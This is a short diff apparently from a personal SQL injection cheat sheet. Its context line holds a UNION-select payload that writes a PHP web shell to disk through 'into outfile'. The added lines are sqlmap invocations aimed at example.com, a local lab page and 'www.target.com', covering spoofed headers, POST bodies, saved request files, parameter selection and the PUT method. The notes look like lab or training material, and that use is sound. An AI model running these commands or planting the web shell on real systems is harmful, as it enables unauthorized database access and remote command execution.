@@ -369,3 +369,10 @@ cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/
 
 sqlmap -u "http://www.example.com/vuln.php?id=1" --batch
 sqlmap --cookie="PHPSESSID=434316675100ae92d691a2c7e88a5f25; security=low" -u "http://localhost:4280/vulnerabilities/sqli/?id=1&Submit=Submit#" -p id --batch
+
+sqlmap 'http://www.example.com/?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' -H 'Accept: image/webp,*/*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'DNT: 1'
+sqlmap 'http://www.example.com/' --data 'uid=1&name=test'
+sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'
+sqlmap -r req.txt
+sqlmap -r req.txt -p id
+sqlmap -u www.target.com --data='id=1' --method PUT
